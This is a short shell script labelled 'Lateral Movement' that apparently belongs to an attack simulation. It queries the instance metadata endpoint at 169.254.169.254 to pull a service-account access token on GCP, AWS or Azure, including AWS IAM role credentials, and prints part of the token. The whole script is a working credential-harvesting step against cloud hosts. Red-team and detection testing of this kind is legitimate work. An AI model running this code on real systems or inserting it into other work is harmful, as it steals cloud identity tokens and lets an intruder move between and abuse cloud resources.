#!/bin/sh
echo "--- Lateral Movement ---"
echo "Sending request to IMDS to retrieve cloud identity token"
if (token=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"| grep -Po '"access_token":"\K.*?(?=")')); then
    cloud="gcp"
elif (awstoken=$(curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")); then
    cloud="aws"
    role=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials" -H "X-aws-ec2-metadata-token: $awstoken")
    token=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -H "X-aws-ec2-metadata-token: $awstoken" | grep -Po '"Token" : "\K.*?(?=")')
else
    cloud="az"
    token=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" | grep -Po '"access_token":"\K.*?(?=")')
fi
test $token && echo "$cloud token: $token" | head -c 50 && echo "..." || echo "no token found"
echo " "
